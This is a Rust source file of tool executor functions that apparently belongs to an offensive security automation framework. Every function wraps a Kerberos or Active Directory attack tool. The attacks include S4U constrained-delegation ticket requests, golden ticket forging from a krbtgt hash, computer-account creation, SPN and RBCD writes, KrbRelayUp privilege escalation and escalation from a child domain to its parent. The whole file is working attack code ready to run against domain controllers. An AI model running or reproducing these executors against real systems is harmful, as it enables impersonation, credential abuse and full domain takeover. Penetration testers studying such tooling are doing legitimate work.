//! Kerberos delegation and domain escalation tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Find delegation configurations in the domain using impacket-findDelegation.
///
/// Required args: `domain`, `username`, `dc_ip`
/// Optional args: `password`, `hash` (at least one required)
pub async fn find_delegation(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let dc_ip = required_str(args, "dc_ip")?;

    let mut cmd = CommandBuilder::new("impacket-findDelegation");

    if let Some(h) = hash {
        cmd = cmd
            .arg(format!("{domain}/{username}"))
            .args(credentials::hash_args(h));
    } else if let Some(p) = password {
        cmd = cmd.arg(format!("{domain}/{username}:{p}"));
    } else {
        anyhow::bail!("find_delegation requires either password or hash");
    }

    cmd.flag("-dc-ip", dc_ip).timeout_secs(120).execute().await
}

/// Perform an S4U (constrained delegation) attack to obtain a service ticket.
///
/// Required args: `domain`, `username`, `target_spn`, `impersonate`
/// Optional args: `password`, `hash`, `dc_ip`
pub async fn s4u_attack(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let hash = optional_str(args, "hash");
    let target_spn = required_str(args, "target_spn")?;
    let impersonate = required_str(args, "impersonate")?;
    let dc_ip = optional_str(args, "dc_ip");

    let (target_str, extra_args) =
        credentials::impacket_auth(Some(domain), username, password, hash, domain);

    let mut cmd = CommandBuilder::new("impacket-getST")
        .flag("-spn", target_spn)
        .flag("-impersonate", impersonate)
        .arg(target_str)
        .args(extra_args)
        .timeout_secs(120);

    cmd = cmd.flag_opt("-dc-ip", dc_ip);

    cmd.execute().await
}

/// Generate a Kerberos golden ticket using impacket-ticketer.
///
/// Required args: `krbtgt_hash`, `domain_sid`, `domain`
/// Optional args: `extra_sid`, `username`
pub async fn generate_golden_ticket(args: &Value) -> Result<ToolOutput> {
    let krbtgt_hash = required_str(args, "krbtgt_hash")?;
    let domain_sid = required_str(args, "domain_sid")?;
    let domain = required_str(args, "domain")?;
    let extra_sid = optional_str(args, "extra_sid");
    let username = optional_str(args, "username").unwrap_or("Administrator");

    CommandBuilder::new("impacket-ticketer")
        .flag("-nthash", krbtgt_hash)
        .flag("-domain-sid", domain_sid)
        .flag("-domain", domain)
        .flag_opt("-extra-sid", extra_sid)
        .flag("-user-id", "500")
        .arg(username)
        .timeout_secs(120)
        .execute()
        .await
}

/// Add a computer account to the domain using impacket-addcomputer.
///
/// Required args: `domain`, `username`, `password`, `computer_name`,
///                `computer_password`, `dc_ip`
pub async fn add_computer(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let computer_name = required_str(args, "computer_name")?;
    let computer_password = required_str(args, "computer_password")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("impacket-addcomputer")
        .arg(target)
        .flag("-computer-name", computer_name)
        .flag("-computer-pass", computer_password)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

/// Add or remove an SPN on a target account using bloodyAD.
///
/// Required args: `domain`, `username`, `password`, `dc_ip`, `action`,
///                `target_account`, `spn`
pub async fn addspn(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let action = required_str(args, "action")?;
    let target_account = required_str(args, "target_account")?;
    let spn = required_str(args, "spn")?;

    let creds = credentials::bloodyad_creds(domain, username, password, dc_ip);

    CommandBuilder::new("bloodyAD")
        .args(creds)
        .arg(action)
        .arg("spn")
        .arg(target_account)
        .arg(spn)
        .timeout_secs(120)
        .execute()
        .await
}

/// Write Resource-Based Constrained Delegation (RBCD) via impacket-rbcd.
///
/// Required args: `domain`, `username`, `password`, `target_computer`,
///                `attacker_sid`, `dc_ip`
pub async fn rbcd_write(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let target_computer = required_str(args, "target_computer")?;
    let attacker_sid = required_str(args, "attacker_sid")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let target = format!("{domain}/{username}:{password}");

    CommandBuilder::new("impacket-rbcd")
        .flag("-delegate-to", target_computer)
        .flag("-delegate-from", attacker_sid)
        .flag("-action", "write")
        .flag("-dc-ip", dc_ip)
        .arg(target)
        .timeout_secs(120)
        .execute()
        .await
}

/// Run KrbRelayUp for local privilege escalation via Kerberos relay.
///
/// Required args: `domain`, `dc_ip`
/// Optional args: `method`, `create_user`, `create_password`
pub async fn krbrelayup(args: &Value) -> Result<ToolOutput> {
    let domain = required_str(args, "domain")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let method = optional_str(args, "method");
    let create_user = optional_str(args, "create_user");
    let create_password = optional_str(args, "create_password");

    CommandBuilder::new("KrbRelayUp")
        .arg("relay")
        .flag("-d", domain)
        .flag("-dc", dc_ip)
        .flag_opt("-m", method)
        .flag_opt("-cls", create_user)
        .flag_opt("-cp", create_password)
        .timeout_secs(120)
        .execute()
        .await
}

/// Escalate from child domain to parent domain using raiseChild.py.
///
/// Required args: `child_domain`, `username`, `password`
/// Optional args: `target_domain`
pub async fn raise_child(args: &Value) -> Result<ToolOutput> {
    let child_domain = required_str(args, "child_domain")?;
    let username = required_str(args, "username")?;
    let password = required_str(args, "password")?;
    let target_domain = optional_str(args, "target_domain");

    let target = format!("{child_domain}/{username}:{password}");

    CommandBuilder::new("raiseChild.py")
        .arg(target)
        .flag_opt("-target-domain", target_domain)
        .timeout_secs(120)
        .execute()
        .await
}
